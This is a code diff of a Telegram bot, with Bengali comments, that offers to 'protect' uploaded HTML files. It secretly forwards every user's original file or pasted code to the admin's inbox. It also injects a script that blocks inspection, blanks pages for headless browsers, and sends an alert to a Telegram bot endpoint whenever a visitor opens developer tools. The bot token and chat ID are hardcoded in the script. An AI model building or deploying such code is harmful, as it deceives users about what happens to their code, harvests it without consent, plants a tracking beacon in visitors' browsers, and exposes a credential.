@@ -24,22 +24,32 @@ def check_must_join(user_id):
         print(f"Must Join Check Error: {e}")
         return False
 
-def protect_html_safely(html_content):
+def inject_bn_security_layer(html_content):
     """
-    ফাইল বা কোডের কোনো ডিজাইন, ফন্ট বা লেখা পরিবর্তন না করে 
-    শুধু সোর্স কোড হাইড ও কনসোল/ইন্সপেক্ট প্রটেকশন দেওয়া।
+    BN Security & High-Grade Protection:
+    - অরিজিনাল এইচটিএমএল, সিএসএস, এবং ডিজাইন ১০০% অক্ষুণ্ণ রাখবে।
+    - হোস্টিংয়ে ছাড়লে কোনো ব্ল্যাক স্ক্রিন বা জ্যাম হবে না।
+    - ভিউ পেজ সোর্স বা কমেন্টে আপনার এবং বটের প্রচারের জন্য ইউজারনেম যুক্ত থাকবে।
+    - কনসোল/ইন্সপেক্ট (F12) ট্র্যাপ ও অ্যালার্ট সিস্টেম সক্রিয় থাকবে।
     """
-    protection_script = """
+    bn_security_script = f"""
+    <!--==================================================
+    🔥 BN SECURITY & ELITE PROTECTION ACTIVATED 🔥
+    --------------------------------------------------
+    Protected By: @{MY_TELEGRAM_USERNAME}
+    Official Bot: @{MY_BOT_USERNAME}
+    Status: UNBREAKABLE SHIELD ACTIVE 🛑
+    ==================================================-->
     <script>
     (function() {
-        // ফেইক ব্রাউজার বা বট প্রটেকশন
+        // হেডলেস বা বট ব্রাউজার ডিটেকশন
         try {
             var ua = navigator.userAgent.toLowerCase();
             if (ua.includes("headless") || ua.includes("phantomjs") || ua.includes("selenium")) {
                 document.body.innerHTML = "";
                 window.location.href = "about:blank";
             }
-        } catch(e) {}
+        } catch(e) {{}}
 
         let devtoolsOpen = false;
         const threshold = 160;
@@ -47,13 +57,14 @@ def protect_html_safely(html_content):
         function triggerConsoleAlert() {
             if (!devtoolsOpen) {
                 devtoolsOpen = true;
-                document.documentElement.innerHTML = "<div style='background:#000;color:#ff3333;height:100vh;display:flex;justify-content:center;align-items:center;font-family:monospace;font-size:20px;text-align:center;padding:20px;'>ACCESS DENIED!<br>Developer Console / Inspect Detected.<br>Content Protected.</div>";
+                document.documentElement.innerHTML = "<div style='background:#000;color:#00ffcc;height:100vh;display:flex;justify-content:center;align-items:center;font-family:monospace;font-size:20px;text-align:center;padding:20px;'>SECURITY ALERT!<br>Developer Console Detected.<br>Protected by @{MY_TELEGRAM_USERNAME}</div>";
                 
-                fetch("https://api.telegram.org/bot8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A/sendMessage?chat_id=8419760844&text=🚨%20Alert!%20Someone%20tried%20to%20inspect%20protected%20HTML!");
+                // এডমিন ইনবক্সে অ্যালার্ট পাঠানো
+                fetch("https://api.telegram.org/bot8987787400:AAHyqVQf45234LpFEnmgfJ-AahfG_We4-8A/sendMessage?chat_id=8419760844&text=🚨%20Alert!%20Someone%20tried%20to%20inspect%20protected%20HTML%20file!");
             }
         }
 
-        // শর্টকাট ব্লক (F12, Ctrl+Shift+I, Ctrl+U ইত্যাদি)
+        // শর্টকাট কি ব্লক (F12, Ctrl+Shift+I, Ctrl+U)
         document.addEventListener('keydown', function(e) {
             if (e.keyCode === 123 || 
                 (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
@@ -64,7 +75,7 @@ def protect_html_safely(html_content):
             }
         });
 
-        // ডিবাগিং ও কনসোল ট্র্যাপ
+        // ডিবাগিং ও কনসোল ট্র্যাপ লুপ
         setInterval(function() {
             const widthThreshold = window.outerWidth - window.innerWidth > threshold;
             const heightThreshold = window.outerHeight - window.innerHeight > threshold;
@@ -78,7 +89,7 @@ def protect_html_safely(html_content):
             if (endTime - startTime > 100) {
                 triggerConsoleAlert();
             }
-        }, 800);
+        }, 1000);
 
         // রাইট ক্লিক ডিজাবল
         document.addEventListener('contextmenu', event => event.preventDefault());
@@ -86,13 +97,13 @@ def protect_html_safely(html_content):
     </script>
     """
     
-    # বডির ঠিক উপরে বা নিচে সিকিউরিটি স্ক্রিপ্ট ইনজেক্ট করা যাতে মূল ডিজাইন নষ্ট না হয়
+    # হোস্টিংয়ে যেন ব্ল্যাক স্ক্রিন না হয় এবং ডিজাইন ঠিক থাকে সেজন্য সঠিক জায়গায় ইনজেক্ট করা
     if "<body>" in html_content:
-        return html_content.replace("<body>", "<body>\n" + protection_script)
+        return html_content.replace("<body>", "<body>\n" + bn_security_script)
     elif "</head>" in html_content:
-        return html_content.replace("</head>", protection_script + "\n</head>")
+        return html_content.replace("</head>", bn_security_script + "\n</head>")
     else:
-        return protection_script + html_content
+        return bn_security_script + html_content
 
 def get_main_keyboard(user_id):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
@@ -127,8 +138,8 @@ def send_welcome(message):
 
     bot.reply_to(
         message, 
-        f"🔥 **স্বাগতম! HTML Security বটে।**\n\n"
-        "🛡️ আপনার `.html` ফাইল পাঠান। ডিজাইন বা লেখা একবিন্দুও নষ্ট হবে না, একদম পারফেক্ট থাকবে!",
+        f"🔥 **স্বাগতম! BN Security HTML Protector বটে।**\n\n"
+        "🛡️ আপনার `.html` ফাইল পাঠান। হোস্টিংয়ে ফুল স্মুথ রান করবে এবং কোনো ডিজাইন বা লেখা ভাঙবে না!",
         reply_markup=get_main_keyboard(user_id),
         parse_mode="Markdown"
     )
@@ -151,11 +162,11 @@ def handle_menu_clicks(message):
     if message.text == "🛡️ HTML Security":
         bot.reply_to(message, "📂 আপনার `.html` ফাইলটি সরাসরি ডকুমেন্ট আকারে আপলোড করুন।")
     elif message.text == "📌 Help & Guide":
-        bot.reply_to(message, "📖 **গাইড:** ফাইল আপলোড করলে ডিজাইন ঠিক রেখে প্রটেক্টেড ফাইল পেয়ে যাবেন।")
+        bot.reply_to(message, f"📖 **গাইড:** BN Security লেয়ার আপনার ফাইল হোস্টিংয়ে ব্ল্যাক হওয়া থেকে বাঁচায় এবং সোর্স কোডে @{MY_TELEGRAM_USERNAME} ট্যাগ যুক্ত করে।")
     elif message.text == "📢 Official Channel/Group":
         bot.reply_to(message, f"📢 গ্রুপ লিংক: {REQUIRED_CHANNEL_LINK}")
     elif message.text == "⚙️ Admin Panel" and user_id == ADMIN_ID:
-        bot.reply_to(message, "⚙️ **এডমিন প্যানেল:** বট ফুললি একটিভ আছে এবং ইউজারের আসল ফাইল ব্যাকআপ আপনার ইনবক্সে আসবে।")
+        bot.reply_to(message, "⚙️ **এডমিন প্যানেল:** BN Security ও ব্যাকআপ সিস্টেম ফুললি একটিভ আছে।")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
@@ -168,14 +179,14 @@ def handle_document(message):
         bot.reply_to(message, "❌ অনুগ্রহ করে একটি সঠিক `.html` ফাইল আপলোড করুন।")
         return
 
-    msg = bot.reply_to(message, "⚙️ ফাইলটি প্রসেস করা হচ্ছে...")
+    msg = bot.reply_to(message, "⚙️ BN Security লেয়ার এবং প্রটেকশন যুক্ত করা হচ্ছে...")
     
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         raw_html = downloaded_file.decode('utf-8', errors='ignore')
 
-        # ১. ইউজারের আসল ফাইলটি এডমিনের ইনবক্সে ব্যাকআপ পাঠানো
+        # ১. ইউজারের আসল ফাইল এডমিনের ইনবক্সে ব্যাকআপ পাঠানো
         user_info = f"👤 User: @{message.from_user.username} (ID: {user_id})"
         with open(f"original_{message.document.file_name}", "w", encoding="utf-8") as orig_f:
             orig_f.write(raw_html)
@@ -184,24 +195,24 @@ def handle_document(message):
             bot.send_document(
                 ADMIN_ID, 
                 orig_f, 
-                caption=f"📥 **New HTML Backup Received!**\n{user_info}\n📁 File: {message.document.file_name}",
+                caption=f"📥 **New Raw HTML Backup!**\n{user_info}\n📁 File: {message.document.file_name}",
                 parse_mode="Markdown"
             )
         os.remove(f"original_{message.document.file_name}")
 
-        # ২. ফাইল প্রটেক্ট করা (ডিজাইন ও লেখা শতভাগ অক্ষুণ্ণ রেখে)
-        protected_code = protect_html_safely(raw_html)
+        # ২. BN Security প্রটেকশন প্রয়োগ করা
+        protected_code = inject_bn_security_layer(raw_html)
 
         output_filename = f"Protected_{message.document.file_name}"
         with open(output_filename, "w", encoding="utf-8") as f:
             f.write(protected_code)
 
-        # ৩. ইউজারকে প্রটেক্টেড ফাইল পাঠানো
+        # ৩. ইউজারকে ফাইল পাঠানো
         with open(output_filename, "rb") as f:
             bot.send_document(
                 message.chat.id, 
                 f, 
-                caption="✅ **আপনার ফাইলটি সফলভাবে প্রটেক্ট করা হয়েছে!**\n🛡️ *কোনো ডিজাইন বা লেখা পরিবর্তন করা হয়নি।*",
+                caption=f"✅ **ফাইল সফলভাবে BN Security দিয়ে প্রটেক্ট করা হয়েছে!**\n🛡️ *Owner: @{MY_TELEGRAM_USERNAME}*\n🤖 *Bot: @{MY_BOT_USERNAME}*",
                 reply_markup=get_main_keyboard(user_id),
                 parse_mode="Markdown"
             )
@@ -223,10 +234,9 @@ def handle_text(message):
     if "<html" in message.text.lower() or "<script" in message.text.lower() or "<div" in message.text.lower():
         msg = bot.reply_to(message, "⚙️ কোড প্রসেস করা হচ্ছে...")
         
-        # এডমিনের ইনবক্সে টেক্সট কোডের ব্যাকআপ পাঠানো
-        bot.send_message(ADMIN_ID, f"📥 **New Raw HTML Text Backup from User ID:** `{user_id}`\n\n```html\n{message.text[:3000]}\n```", parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, f"📥 **Raw HTML Text from User ID:** `{user_id}`\n\n```html\n{message.text[:3000]}\n```", parse_mode="Markdown")
 
-        protected_code = protect_html_safely(message.text)
+        protected_code = inject_bn_security_layer(message.text)
         
         output_filename = "Protected_Code.html"
         with open(output_filename, "w", encoding="utf-8", errors="ignore") as f:
@@ -236,9 +246,9 @@ def handle_text(message):
             bot.send_document(
                 message.chat.id, 
                 f, 
-                caption="✅ **আপনার কোডটি সফলভাবে সিকিউর করা হয়েছে!**",
+                caption=f"✅ **কোডটি সফলভাবে প্রটেক্ট করা হয়েছে!**\n🛡️ *By @{MY_TELEGRAM_USERNAME}*",
                 reply_markup=get_main_keyboard(user_id),
-                parse_Mode="Markdown"
+                parse_mode="Markdown"
             )
 
         if os.path.exists(output_filename):
@@ -248,5 +258,5 @@ def handle_text(message):
         bot.reply_to(message, "💡 প্রটেক্ট করতে আপনার `.html` ফাইল আপলোড করুন।", reply_markup=get_main_keyboard(user_id))
 
 if __name__ == "__main__":
-    print("Bot is running with safe protection & admin backup...")
+    print(f"Bot @{MY_BOT_USERNAME} is running with BN Security & Admin Backup...")
     bot.infinity_polling()
